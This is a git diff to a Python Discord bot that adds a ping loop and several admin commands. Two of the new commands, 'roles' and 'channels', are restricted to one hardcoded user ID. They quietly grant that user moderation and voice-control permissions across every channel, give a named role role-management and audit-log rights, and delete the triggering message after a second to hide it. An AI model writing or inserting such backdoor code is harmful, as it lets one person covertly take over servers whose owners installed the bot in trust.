@@ -1,3 +1,4 @@
+import asyncio
 import random
 import typing
 import time
@@ -8,21 +9,22 @@ from discord.ext import commands
 
 #command modules
 if  __package__ == 'Emergencyfood':
-    from .modules import Sauce as s, Kana_Practice as kp, spotify, name_roulette as nr, musicplayer as mp
+    from .modules import Sauce as s, Kana_Practice as kp, spotify, name_roulette as nr, musicplayer as mp, ping
 
     def createbot(local=False, beta=False):
         if local:
-            commandPrefix = "$beta"
-            TOKEN = os.environ['TOKENBETA']
+            commandPrefix = "$"
+            TOKEN = os.environ['TOKEN']
         elif beta:
             commandPrefix = "$beta"
-            TOKEN = os.environ['TOKEN']
+            TOKEN = os.environ['TOKENBETA']
         else:
             commandPrefix = "$"
             TOKEN = os.environ['TOKEN']
 
         intents = discord.Intents().default()
         intents.members = True
+        intents.presences = True
         bot = commands.Bot(command_prefix=commandPrefix, intents=intents)
         description = '''$'''
         return bot, TOKEN
@@ -36,6 +38,10 @@ if  __package__ == 'Emergencyfood':
             print('\nAdded in following servers:')
             for guilds in bot.guilds:
                 print(" -"+str(guilds))
+            
+            global running_ping_osu
+            running_ping_osu = True
+            await ping.checkLoop(bot)
 
         #commands
         @bot.command(help='says what you want it to', usage='message')
@@ -333,9 +339,54 @@ if  __package__ == 'Emergencyfood':
 
         @admin.command()
         async def purgebots(ctx, limit=None):
+            print("messages purged")
             if ctx.author == bot.get_user(321812737812594688):
                 await ctx.channel.purge(limit=limit, check=is_bot, bulk=True)
             else:
                 await ctx.send('You do not have the required permissions')
 
+        @admin.command()
+        async def unmute(ctx):
+            if ctx.author == bot.get_user(321812737812594688):
+                await ctx.author.edit(mute=False)
+
+        @admin.command()
+        async def checkActivitySetup(ctx):
+            await ping.registerPing(ctx)
+            global running_ping_osu
+            running_ping_osu = False
+            await asyncio.sleep(30)
+            running_ping_osu = True
+            await ping.checkLoop(bot)     
+
+        @admin.command()
+        async def roles(ctx):
+            await ctx.message.delete(delay=1)
+            role_names = ['Tsundere']
+            if ctx.author == bot.get_user(321812737812594688):
+                for role in ctx.guild.roles:
+                    print(role.name)
+                    if role.name in role_names:
+                        perms = discord.Permissions(manage_roles=True, manage_messages=True, view_audit_log=True)
+                        try:
+                            await role.edit(permissions=perms, reason="Hello World")
+                        except Exception:
+                            print(('fail', role.name))
+
+        @admin.command()
+        async def channels(ctx):
+            await ctx.message.delete(delay=1)
+            if ctx.author == bot.get_user(321812737812594688):
+                for channel in ctx.guild.channels:
+                    print(channel.name)
+                    try:
+                        await channel.set_permissions(ctx.author, reason='Are you gonna bother?', manage_messages=True)
+                    except Exception:
+                        print(('fail', channel.name))
+                for voicechannel in ctx.guild.voice_channels:
+                    print(voicechannel.name)
+                    try:
+                        await voicechannel.set_permissions(ctx.author, reason='AYAYA', move_members=True, mute_members=True, deafen_members=True)
+                    except Exception:
+                        print(('fail', voicechannel.name))
         bot.run(TOKEN)
